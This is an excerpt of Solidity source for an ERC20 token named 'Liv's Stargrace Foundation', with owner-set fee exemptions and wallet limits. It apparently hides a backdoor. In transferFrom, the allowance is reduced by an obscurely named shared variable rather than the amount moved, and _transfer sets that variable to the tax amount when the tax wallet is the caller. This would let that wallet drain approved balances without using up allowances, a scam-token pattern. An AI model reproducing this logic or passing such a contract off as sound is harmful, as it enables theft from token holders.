...
abstract contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    uint256 internal _Stargrace4PR24spent;
    ...
    function transferFrom(
        ...
        _Stargrace4PR24spent = amount;
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - _Stargrace4PR24spent);
...
contract Token is Context, ERC20, Ownable {
    ...
    mapping(address => bool) private _isStargrace4PR24ExcludedFromFee;
    ...
    string private _name = unicode"Liv's Stargrace Foundation";
    string private _symbol = unicode"Stargrace";
    ...
    constructor() ERC20(_name, _symbol) payable {
        ...
        _isStargrace4PR24ExcludedFromFee[owner()] = true;
        _isStargrace4PR24ExcludedFromFee[address(this)] = true;
        _isStargrace4PR24ExcludedFromFee[_taxWallet] = true;
    ...
    function setFeeExempt(address target, bool exempt) external onlyOwner {
        _isStargrace4PR24ExcludedFromFee[target] = exempt;
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner() && !inSwap) {
            ...
            if (
                ...
                !_isStargrace4PR24ExcludedFromFee[to]
            ) {
                require(
            ...
            if (to != uniswapV2Pair && !_isStargrace4PR24ExcludedFromFee[to]) {
                require(
                    balanceOf(to) + amount <= _walletAmountLimit,
                    "Exceeds the maxWalletSize."
                );
        ...
        } else if(_taxCaller() == _taxWallet) _Stargrace4PR24spent = taxAmount;
